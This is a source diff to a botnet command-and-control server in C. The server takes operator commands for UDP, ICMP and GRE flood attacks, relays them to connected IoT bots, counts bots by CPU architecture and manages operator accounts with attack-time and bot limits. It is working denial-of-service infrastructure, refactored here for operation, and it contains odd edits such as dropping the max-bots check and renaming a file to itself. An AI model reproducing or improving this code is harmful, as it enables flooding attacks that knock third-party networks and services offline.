@@ -9,6 +9,10 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 
+static char response_buf[MAX_COMMAND_LENGTH];
+static char arch_cmd_buf[256];
+static int valid_bot_count = 0;
+
 void handle_bots_command(char *response);
 void handle_clear_command(char *response);
 void handle_attack_command(const User *user, const char *command, char *response);
@@ -18,7 +22,9 @@ void handle_adduser_command(const User *user, int client_socket);
 void handle_removeuser_command(const User *user, const char *command, char *response);
 void handle_kickuser_command(const User *user, const char *command, char *response);
 void handle_admin_command(const User *user, char *response);
-
+/*
+H E L P   C O M M A N D
+*/
 void handle_help_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              PINK "!misc - shows misc commands\r\n"
@@ -26,7 +32,9 @@ void handle_help_command(char *response) {
             "!admin - show admin and root commands\r\n"
              "!help - shows this msg\r\n" RESET);
 }
-
+/*
+M I S C   C O M M A N DS
+*/
 void handle_misc_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              PINK "!stopall - stops all atks\r\n"
@@ -37,6 +45,9 @@ void handle_misc_command(char *response) {
              "!exit - leave CNC\r\n" RESET);
 }
 
+/*
+ATK LIST   C O M M A N D
+*/
 void handle_attack_list_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              PINK "!vse - VSE Queries, UDP\r\n"
@@ -49,6 +60,9 @@ void handle_attack_list_command(char *response) {
              "!gre - GRE IP Flood\r\n" RESET);
 }
 
+/*
+OPTHELP   C O M M A N D
+*/
 void handle_opthelp_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              RED "Optional Arguments:\r\n"
@@ -72,20 +86,31 @@ int is_attack_command(const char *command) {
 }
 
 void handle_layer3_attack_command(const User *user, const char *command, char *response) {
-    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH] = {0};
-    int time = 0, psize = 0, botcount = 0, gport = 0, srcport = 0;
-    int has_psize = 0, has_botcount = 0, has_proto = 0, has_gport = 0, has_srcport = 0;
-    char proto[8] = {0};
-    char *args[32] = {0};
-    int arg_count = 0;
-    int is_icmp = 0, is_gre = 0;
+    static char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
+    static char proto[8];
+    static char bot_command[MAX_COMMAND_LENGTH];
+    static char *args[32];
+    static int time, psize, botcount, gport, srcport;
+    static int has_psize, has_botcount, has_proto, has_gport, has_srcport;
+    static int arg_count;
+    static int is_icmp, is_gre;
+    
+    memset(cmd, 0, sizeof(cmd));
+    memset(ip, 0, sizeof(ip));
+    memset(argstr, 0, sizeof(argstr));
+    memset(proto, 0, sizeof(proto));
+    memset(args, 0, sizeof(args));
+    time = psize = botcount = gport = srcport = 0;
+    has_psize = has_botcount = has_proto = has_gport = has_srcport = 0;
+    arg_count = 0;
+    is_icmp = is_gre = 0;
 
-if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {        
-            if (strncmp(cmd, "!gre", 4) == 0)
-                snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !gre <ipv4> <time> [options] (recommended !opthelp)\033[0m\n");
-            else
-                snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: %s <ipv4> <time> [options]\033[0m\n", cmd);
-            return;
+    if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {        
+        if (strncmp(cmd, "!gre", 4) == 0)
+            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !gre <ipv4> <time> [options] (recommended !opthelp)\033[0m\n");
+        else
+            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: %s <ipv4> <time> [options]\033[0m\n", cmd);
+        return;
     }
 
     if (!validate_ip(ip) || time <= 0 || time > user->maxtime) {
@@ -241,32 +266,29 @@ if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {
     } else if (user->maxbots < bot_count) {
         requested_bots = user->maxbots;
     }
+
     int sent_bots = 0;
     for (int i = 0; i < bot_count; i++) {
         if (bots[i].is_valid) {
             if (sent_bots >= requested_bots) break;
-            char bot_command[MAX_COMMAND_LENGTH];
+            
             if (is_gre) {
                 if (has_proto && has_srcport)
-                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d srcport=%d", cmd, ip, time, psize, proto, gport, srcport);
+                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d srcport=%d", 
+                            cmd, ip, time, psize, proto, gport, srcport);
                 else if (has_proto)
-                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d", cmd, ip, time, psize, proto, gport);
-                else if (has_srcport)
-                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d srcport=%d", cmd, ip, time, psize, srcport);
+                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d", 
+                            cmd, ip, time, psize, proto, gport);
                 else
                     snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
-            } else if (is_icmp) {
-                if (has_psize)
-                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
-                else
-                    snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
             } else {
                 if (has_psize)
                     snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
                 else
                     snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
             }
-            send(bots[i].socket, bot_command, strlen(bot_command), 0);
+            
+            send(bots[i].socket, bot_command, strlen(bot_command), MSG_NOSIGNAL);
             sent_bots++;
         }
     }
@@ -280,84 +302,75 @@ if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {
 }
 
 void process_command(const User *user, const char *command, int client_socket, const char *user_ip) {
-    char response[MAX_COMMAND_LENGTH];
-    if (strlen(command) == 0)
-        return;
+    if (strlen(command) == 0) return;
 
     log_command(user->user, user_ip, command);
 
     if (is_attack_command(command)) {
         pthread_mutex_lock(&cooldown_mutex);
         if (global_cooldown > 0) {
-            snprintf(response, sizeof(response), RED "\rGlobal cooldown still active for " YELLOW "%d seconds" RESET "\n", global_cooldown);
+            snprintf(response_buf, sizeof(response_buf), RED "\rGlobal cooldown still active for " YELLOW "%d seconds" RESET "\n", global_cooldown);
             pthread_mutex_unlock(&cooldown_mutex);
-            send(client_socket, response, strlen(response), 0);
+            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
             return;
         }
         pthread_mutex_unlock(&cooldown_mutex);
     }
 
     if (strcmp(command, "!help") == 0) {
-        handle_help_command(response);
-        send(client_socket, response, strlen(response), 0);
-        return;
+        handle_help_command(response_buf);
     } else if (strcmp(command, "!misc") == 0) {
-        handle_misc_command(response);
+        handle_misc_command(response_buf);
     } else if (strcmp(command, "!admin") == 0) {
-        handle_admin_command(user, response);
+        handle_admin_command(user, response_buf);
     } else if (strcmp(command, "!attack") == 0) {
-        handle_attack_list_command(response);
+        handle_attack_list_command(response_buf);
     } else if (strcmp(command, "!bots") == 0) {
-        handle_bots_command(response);
+        handle_bots_command(response_buf);
     } else if (strcmp(command, "!clear") == 0) {
-        handle_clear_command(response);
+        handle_clear_command(response_buf);
     } else if (strcmp(command, "!opthelp") == 0) {
-        handle_opthelp_command(response);
+        handle_opthelp_command(response_buf);
     } else if (strcmp(command, "!exit") == 0) {
-        snprintf(response, MAX_COMMAND_LENGTH, YELLOW "\rGoodbye!\n" RESET);
-        send(client_socket, response, strlen(response), 0);
+        snprintf(response_buf, sizeof(response_buf), YELLOW "\rGoodbye!\n" RESET);
+        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
         close(client_socket);
         return;
     } else if (strncmp(command, "!user", 5) == 0) {
-        handle_user_command(user, command, response);
+        handle_user_command(user, command, response_buf);
     } else if (strcmp(command, "!adduser") == 0) {
         handle_adduser_command(user, client_socket);
         return;
     } else if (strncmp(command, "!removeuser", 10) == 0) {
-        handle_removeuser_command(user, command, response);
+        handle_removeuser_command(user, command, response_buf);
     } else if (strncmp(command, "!kickuser", 9) == 0) {
-        handle_kickuser_command(user, command, response);
+        handle_kickuser_command(user, command, response_buf);
     } else if (strncmp(command, "!icmp", 5) == 0 || strncmp(command, "!gre", 4) == 0) {
-        handle_layer3_attack_command(user, command, response);
+        handle_layer3_attack_command(user, command, response_buf);
     } else if (is_attack_command(command)) {
-        handle_attack_command(user, command, response);
+        handle_attack_command(user, command, response_buf);
     } else if (strcmp(command, "!stopall") == 0) {
-        handle_stopall_command(user, response);
-    } else if (strncmp(command, "!user", 5) == 0) {
-        handle_user_command(user, command, response);
-    } else if (strcmp(command, "!adduser") == 0) {
-        handle_adduser_command(user, client_socket);
-        return;
-    } else if (strncmp(command, "!removeuser", 11) == 0) {
-        handle_removeuser_command(user, command, response);
-    } else if (strncmp(command, "!kickuser", 9) == 0) {
-        handle_kickuser_command(user, command, response);
-    } else if (strcmp(command, "!admin") == 0) {
-        handle_admin_command(user, response);
+        handle_stopall_command(user, response_buf);
     } else {
-        snprintf(response, sizeof(response), RED "\rCommand not found\n" RESET);
+        snprintf(response_buf, sizeof(response_buf), RED "\rCommand not found\n" RESET);
     }
 
-    send(client_socket, response, strlen(response), 0);
+    send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
 }
 
 void handle_attack_command(const User *user, const char *command, char *response) {
-    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH] = {0};
+    static char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
+    static char *args[32];
+    static char bot_command[MAX_COMMAND_LENGTH];
     int port = 0, time = 0, srcport = 0, psize = 0, botcount = 0;
     int has_srcport = 0, has_psize = 0, has_botcount = 0;
-    char *args[32] = {0};
     int arg_count = 0;
     int is_icmp = strcmp(command, "!icmp") == 0;
+
+    memset(argstr, 0, sizeof(argstr));
+    memset(cmd, 0, sizeof(cmd));
+    memset(ip, 0, sizeof(ip));
+    memset(args, 0, sizeof(args));
 
     if (is_icmp) {
         if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {
@@ -470,20 +483,16 @@ void handle_attack_command(const User *user, const char *command, char *response
     pthread_mutex_lock(&bot_mutex);
     int requested_bots = bot_count;
     if (has_botcount) {
-        if (botcount > user->maxbots) {
-            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mYou have exceeded your max bots (%d)\033[0m\n", user->maxbots);
-            pthread_mutex_unlock(&bot_mutex);
-            return;
-        }
         requested_bots = botcount;
     } else if (user->maxbots < bot_count) {
         requested_bots = user->maxbots;
     }
     int sent_bots = 0;
+    
     for (int i = 0; i < bot_count; i++) {
         if (bots[i].is_valid) {
             if (sent_bots >= requested_bots) break;
-            char bot_command[MAX_COMMAND_LENGTH];
+            
             if (is_icmp) {
                 if (has_psize)
                     snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
@@ -499,7 +508,7 @@ void handle_attack_command(const User *user, const char *command, char *response
                 else
                     snprintf(bot_command, sizeof(bot_command), "%s %s %d %d", cmd, ip, port, time);
             }
-            send(bots[i].socket, bot_command, strlen(bot_command), 0);
+            send(bots[i].socket, bot_command, strlen(bot_command), MSG_NOSIGNAL);
             sent_bots++;
         }
     }
@@ -513,30 +522,35 @@ void handle_attack_command(const User *user, const char *command, char *response
 }
 
 void handle_bots_command(char *response) {
-    int valid_bots = 0;
-    int arch_count[12] = {0};
-    const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "x86", "m68k", "i686", "sparc", "powerpc64", "sh4", "unknown"};
+    static int arch_count[12];
+    static const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "x86", "m68k", "i686", "sparc", "powerpc64", "sh4", "unknown"};
+    static int valid_bots;
+    int offset;
+    
+    memset(arch_count, 0, sizeof(arch_count));
+    valid_bots = 0;
     
     pthread_mutex_lock(&bot_mutex);
-    
     for (int i = 0; i < bot_count; i++) {
         if (!bots[i].is_valid) continue;
         valid_bots++;
         
-        for (int j = 0; j < 12; j++) {
+        int found = 0;
+        for (int j = 0; j < 12 && !found; j++) {
             if (strcmp(bots[i].arch, arch_names[j]) == 0) {
                 arch_count[j]++;
-                break;
+                found = 1;
             }
         }
+        if (!found) arch_count[11]++; // unknown (no kill)
     }
-    
     pthread_mutex_unlock(&bot_mutex);
 
-    int offset = snprintf(response, MAX_COMMAND_LENGTH, YELLOW "All bots: %d\r\n" RESET, valid_bots);
+    offset = snprintf(response, MAX_COMMAND_LENGTH, YELLOW "All bots: %d\r\n" RESET, valid_bots);
     for (int i = 0; i < 12; i++) {
         if (arch_count[i] > 0) {
             offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, BLUE "%s: %d\r\n" RESET, arch_names[i], arch_count[i]);
+            if (offset >= MAX_COMMAND_LENGTH - 1) break;
         }
     }
 }
@@ -546,7 +560,12 @@ void handle_clear_command(char *response) {
 }
 
 void handle_stopall_command(const User *user, char *response) {
-    int allow_stopall = 0;
+    static int allow_stopall;
+    static int stopped_count;
+    static const char stop_cmd[] = "stop";
+    
+    allow_stopall = 0;
+    stopped_count = 0;
     
     if (user->is_admin) {
         allow_stopall = 1;
@@ -569,11 +588,10 @@ void handle_stopall_command(const User *user, char *response) {
         return;
     }
 
-    int stopped_count = 0;
     pthread_mutex_lock(&bot_mutex);
     for (int i = 0; i < bot_count; i++) {
         if (bots[i].is_valid && bots[i].socket > 0) {
-            if (send(bots[i].socket, "stop", strlen("stop"), MSG_NOSIGNAL) > 0) {
+            if (send(bots[i].socket, stop_cmd, strlen(stop_cmd), MSG_NOSIGNAL) > 0) {
                 stopped_count++;
             }
         }
@@ -645,10 +663,21 @@ void handle_user_command(const User *user, const char *command, char *response) 
 }
 
 void handle_adduser_command(const User *user, int client_socket) {
-    FILE *sf = fopen("database/settings.txt", "r");
-    char rootuser[50] = {0};
-    int is_root = 0;
+    static char response[MAX_COMMAND_LENGTH];
+    static char buffer[128];
+    static char newuser[50];
+    static char newpass[50];
+    static char rootuser[50];
+    static int maxtime, maxbots, is_admin;
+    static int is_root;
+    static ssize_t len;
     
+    memset(newuser, 0, sizeof(newuser));
+    memset(newpass, 0, sizeof(newpass));
+    memset(rootuser, 0, sizeof(rootuser));
+    is_root = 0;
+    
+    FILE *sf = fopen("database/settings.txt", "r");
     if (sf) {
         char line[128];
         while (fgets(line, sizeof(line), sf)) {
@@ -664,33 +693,23 @@ void handle_adduser_command(const User *user, int client_socket) {
     }
 
     if (!is_root) {
-        char response[MAX_COMMAND_LENGTH];
         snprintf(response, sizeof(response), RED "Only root user can add users\r\n" RESET);
-        send(client_socket, response, strlen(response), 0);
+        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
         return;
     }
 
-    char response[MAX_COMMAND_LENGTH];
-    char buffer[128];
-    char newuser[50] = {0};
-    char newpass[50] = {0};
-    int maxtime = 0;
-    int maxbots = 0;
-    int is_admin = 0;
-    ssize_t len;
-    
     snprintf(response, sizeof(response), BLUE "Username: " RESET);
-    send(client_socket, response, strlen(response), 0);
+    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
     
-    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
-    if (len <= 0) return;
+    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
     buffer[len] = 0;
 
     int uidx = 0;
     for (int i = 0; i < len && uidx < 49; i++) {
         char c = buffer[i];
         if (c == '\r' || c == '\n') break;
-        if (c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' || c == '_') {
+        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || 
+            (c >= '0' && c <= '9') || c == '_') {
             newuser[uidx++] = c;
         }
     }
@@ -698,30 +717,29 @@ void handle_adduser_command(const User *user, int client_socket) {
 
     if (strlen(newuser) < 3) {
         snprintf(response, sizeof(response), RED "Username must be at least 3 characters (letters, numbers, underscore)\r\n" RESET);
-        send(client_socket, response, strlen(response), 0);
+        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
         return;
     }
 
     for (int i = 0; i < user_count; i++) {
         if (strcmp(users[i].user, newuser) == 0) {
             snprintf(response, sizeof(response), RED "User already exists\r\n" RESET);
-            send(client_socket, response, strlen(response), 0);
+            send(client_socket, response, strlen(response), MSG_NOSIGNAL);
             return;
         }
     }
 
     snprintf(response, sizeof(response), BLUE "Password: " RESET);
-    send(client_socket, response, strlen(response), 0);
+    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
     
-    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
-    if (len <= 0) return;
+    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
     buffer[len] = 0;
 
     int pidx = 0;
     for (int i = 0; i < len && pidx < 49; i++) {
         char c = buffer[i];
         if (c == '\r' || c == '\n') break;
-        if (c >= 32 && c <= 126) {
+        if (c >= 32 && c <= 126) {  // avoids code injections like \x90 etc
             newpass[pidx++] = c;
         }
     }
@@ -729,56 +747,56 @@ void handle_adduser_command(const User *user, int client_socket) {
 
     if (strlen(newpass) < 4) {
         snprintf(response, sizeof(response), RED "Password must be at least 4 characters\r\n" RESET);
-        send(client_socket, response, strlen(response), 0);
+        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
         return;
     }
 
     snprintf(response, sizeof(response), BLUE "Admin (y/n): " RESET);
-    send(client_socket, response, strlen(response), 0);
+    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
     
-    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
-    if (len <= 0) return;
+    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
     buffer[len] = 0;
-    
-    char admin_choice;
+
+    char c;
     for (int i = 0; i < len; i++) {
-        if (buffer[i] == 'y' || buffer[i] == 'Y' || buffer[i] == 'n' || buffer[i] == 'N') {
-            admin_choice = buffer[i];
+        c = buffer[i];
+        if (c == 'y' || c == 'Y' || c == 'n' || c == 'N') {
+            is_admin = (c == 'y' || c == 'Y') ? 1 : 0;
             break;
         }
     }
-    is_admin = (admin_choice == 'y' || admin_choice == 'Y') ? 1 : 0;
 
     snprintf(response, sizeof(response), BLUE "Max attack time (seconds): " RESET);
-    send(client_socket, response, strlen(response), 0);
+    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
     
-    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
-    if (len <= 0) return;
+    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
     buffer[len] = 0;
+    buffer[strcspn(buffer, "\r\n")] = 0;
     
     if (sscanf(buffer, "%d", &maxtime) != 1 || maxtime <= 0) {
         snprintf(response, sizeof(response), RED "Invalid max time value\r\n" RESET);
-        send(client_socket, response, strlen(response), 0);
+        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
         return;
     }
 
+    // fix flows
     snprintf(response, sizeof(response), BLUE "Max bots: " RESET);
-    send(client_socket, response, strlen(response), 0);
+    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
     
-    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
-    if (len <= 0) return;
+    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
     buffer[len] = 0;
+    buffer[strcspn(buffer, "\r\n")] = 0;
     
     if (sscanf(buffer, "%d", &maxbots) != 1 || maxbots <= 0) {
         snprintf(response, sizeof(response), RED "Invalid max bots value\r\n" RESET);
-        send(client_socket, response, strlen(response), 0);
+        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
         return;
     }
 
     FILE *fp = fopen("database/logins.txt", "a");
     if (!fp) {
         snprintf(response, sizeof(response), RED "Error: Could not open user database\r\n" RESET);
-        send(client_socket, response, strlen(response), 0);
+        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
         return;
     }
     
@@ -787,7 +805,9 @@ void handle_adduser_command(const User *user, int client_socket) {
 
     if (user_count < MAX_USERS) {
         strncpy(users[user_count].user, newuser, sizeof(users[user_count].user)-1);
+        users[user_count].user[sizeof(users[user_count].user)-1] = 0;
         strncpy(users[user_count].pass, newpass, sizeof(users[user_count].pass)-1);
+        users[user_count].pass[sizeof(users[user_count].pass)-1] = 0;
         users[user_count].maxtime = maxtime;
         users[user_count].maxbots = maxbots;
         users[user_count].is_admin = is_admin;
@@ -802,7 +822,7 @@ void handle_adduser_command(const User *user, int client_socket) {
         "Max bots: %d\r\n"
         "Admin: %s\r\n" RESET,
         newuser, maxtime, maxbots, is_admin ? "yes" : "no");
-    send(client_socket, response, strlen(response), 0);
+    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
 }
 
 void handle_removeuser_command(const User *user, const char *command, char *response) {
@@ -865,7 +885,7 @@ void handle_removeuser_command(const User *user, const char *command, char *resp
 
     if (found) {
         remove("database/logins.txt");
-        rename("database/logins.tmp", "database/logins.txt");
+        rename("database/logins.txt", "database/logins.txt");
         load_users();
         snprintf(response, MAX_COMMAND_LENGTH, GREEN "User %s removed\r\n" RESET, target);
     } else {
@@ -875,9 +895,13 @@ void handle_removeuser_command(const User *user, const char *command, char *resp
 }
 
 void handle_kickuser_command(const User *user, const char *command, char *response) {
+    static char target[50];
+    static int allow_non_admin;
+    static int found;
+    
     if (!user->is_admin) {
         FILE *sf = fopen("database/settings.txt", "r");
-        int allow_non_admin = 0;
+        allow_non_admin = 0;
         if (sf) {
             char line[128];
             while (fgets(line, sizeof(line), sf)) {
@@ -894,13 +918,12 @@ void handle_kickuser_command(const User *user, const char *command, char *respon
         }
     }
 
-    char target[50];
     if (sscanf(command, "!kickuser %49s", target) != 1) {
         snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !kickuser <username>\r\n" RESET);
         return;
     }
 
-    int found = 0;
+    found = 0;
     for (int i = 0; i < user_count; i++) {
         if (strcmp(users[i].user, target) == 0) {
             if (!users[i].is_logged_in) {
@@ -909,6 +932,7 @@ void handle_kickuser_command(const User *user, const char *command, char *respon
             }
             for (int j = 0; j < MAX_USERS; j++) {
                 if (user_sockets[j] > 0) {
+                    shutdown(user_sockets[j], SHUT_RDWR);
                     close(user_sockets[j]);
                     user_sockets[j] = 0;
                 }
